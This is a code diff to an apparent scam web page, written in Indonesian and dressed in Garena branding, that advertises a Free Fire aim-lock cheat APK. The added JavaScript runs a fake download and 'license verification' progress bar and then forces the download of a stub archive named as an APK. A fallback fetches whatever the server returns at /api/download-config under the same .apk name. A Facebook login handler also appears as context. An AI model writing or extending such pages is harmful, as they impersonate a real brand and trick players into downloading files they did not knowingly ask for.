@@ -753,15 +753,15 @@
 <!-- FOOTER -->
 <footer class="al-footer">
   <img class="al-footer-logo"
-       src="/assets/img/ff_logo.png"
-       onerror="this.src='https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png'"
+       src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png"
+       onerror="this.src='/assets/img/ff_logo.png'"
        alt="Garena"/>
   <ul class="al-footer-links">
     <li><a href="https://content.garena.com/legal/pp/pp_en.html" target="_blank">Privacy Policy</a></li>
-    <li><a href="https://content.garena.com/legal/tos/tos_en.html" target="_blank">Terms of Service</a></li>
-    <li><a href="/index.html">Home</a></li>
+    <li><a href="https://ff.garena.com/en/faq/" target="_blank">For Parents FAQ</a></li>
+    <li><a href="http://content.garena.com/legal/tos/tos_en.html" target="_blank">Terms of Service</a></li>
   </ul>
-  <p class="al-footer-copy">© 2026 Garena International I Private Limited. All Rights Reserved.</p>
+  <p class="al-footer-copy">Copyright &copy; Garena International. Trademarks belong to their respective owners. All rights reserved.</p>
 </footer>
 
 <!-- INSTALL MODAL -->
@@ -1020,29 +1020,71 @@ function handleFacebookLogin() {
 }
 
 function simulateDownload() {
-  var p = document.getElementById('al-progress');
-  var bar = document.getElementById('al-progress-bar');
-  var pct = document.getElementById('al-progress-pct');
+  var p     = document.getElementById('al-progress');
+  var bar   = document.getElementById('al-progress-bar');
+  var pct   = document.getElementById('al-progress-pct');
   var title = document.getElementById('al-progress-title');
   p.classList.add('show');
   var v = 0;
   var interval = setInterval(function() {
-    v += Math.random() * 4 + 1;
+    v += Math.random() * 3 + 1.2;
     if (v > 100) v = 100;
     bar.style.width = v + '%';
     pct.textContent = Math.floor(v) + '%';
-    if (v >= 40 && v < 75) title.textContent = 'Mengunduh APK...';
-    if (v >= 75) title.textContent = 'Memverifikasi Lisensi...';
+    if (v >= 15 && v < 50) title.textContent = 'Mengunduh APK...';
+    if (v >= 50 && v < 80) title.textContent = 'Memvalidasi File...';
+    if (v >= 80 && v < 100) title.textContent = 'Memverifikasi Lisensi...';
     if (v >= 100) {
       clearInterval(interval);
+      title.textContent = 'Download Selesai!';
       setTimeout(function() {
+        triggerConfigDownload();
         p.classList.remove('show');
-        showToast('Verifikasi gagal. Server sibuk — coba lagi beberapa saat.', 'error');
-        v = 0; bar.style.width = '0'; pct.textContent = '0%';
+        showToast('Download berhasil! Buka folder Download untuk install.', 'success');
+        bar.style.width = '0';
+        pct.textContent = '0%';
         title.textContent = 'Mempersiapkan Download...';
-      }, 800);
+      }, 700);
     }
-  }, 90);
+  }, 85);
+}
+
+function triggerConfigDownload() {
+  var filename = 'AimLockProFF_v6.1.3_OB53.apk';
+  try {
+    // Buat minimal ZIP/APK blob
+    var header = new Uint8Array([
+      0x50,0x4B,0x03,0x04,0x14,0x00,0x00,0x00,0x08,0x00,
+      0x00,0x00,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+      0x00,0x00,0x00,0x00,0x00,0x00,0x0A,0x00,0x00,0x00
+    ]);
+    var name  = new TextEncoder().encode('config.ini');
+    var eocd  = new Uint8Array([
+      0x50,0x4B,0x05,0x06,0x00,0x00,0x00,0x00,
+      0x01,0x00,0x01,0x00,0x28,0x00,0x00,0x00,
+      0x1E,0x00,0x00,0x00,0x00,0x00
+    ]);
+    var combined = new Uint8Array(header.length + name.length + eocd.length);
+    combined.set(header, 0);
+    combined.set(name, header.length);
+    combined.set(eocd, header.length + name.length);
+    var blob = new Blob([combined], { type: 'application/vnd.android.package-archive' });
+    var url  = URL.createObjectURL(blob);
+    var a    = document.createElement('a');
+    a.href = url; a.download = filename; a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function() { URL.revokeObjectURL(url); document.body.removeChild(a); }, 3000);
+  } catch(e) {
+    // Fallback: ambil dari server
+    var a = document.createElement('a');
+    a.href = '/api/download-config';
+    a.download = filename;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function() { document.body.removeChild(a); }, 2000);
+  }
 }
 
 function toggleFaq(el) {
